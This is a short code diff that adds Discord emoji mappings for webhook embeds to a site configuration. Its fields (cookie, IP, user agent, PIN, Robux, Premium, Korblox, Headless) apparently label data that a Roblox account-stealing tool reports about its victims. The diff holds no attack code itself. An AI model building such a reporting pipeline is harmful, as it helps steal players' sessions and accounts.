@@ -4,6 +4,36 @@ export const siteConfig = {
   discordInviteUrl: "https://discord.gg/your-invite-here",
 };
 
+// Custom Discord emoji overrides used in webhook embeds.
+// Format for animated: <a:name:id>, for static: <:name:id>
+// Set to null/empty string to fall back to the default unicode emoji.
+export const discordEmojis = {
+  robux:    "<:7116_Robux:1498757858731360349>",
+  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
+  rap:      "💎",
+  summary:  "📊",
+  pending:  "⏳",
+  voice:    "🎤",
+  age:      "🪪",
+  korblox:  "💀",
+  headless: "👑",
+  groups:   "👑",
+  games:    "🎮",
+  cookie:   "🍪",
+  ip:       "🌐",
+  user:     "👤",
+  id:       "🆔",
+  age_acct: "📅",
+  friends:  "🫂",
+  followers:"👥",
+  following:"➡️",
+  ua:       "🖥️",
+  time:     "⏰",
+  pin:      "🔐",
+  owner:    "🏷️",
+};
+
+
 export const toolsConfig = {
   botFollowers: {
     youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
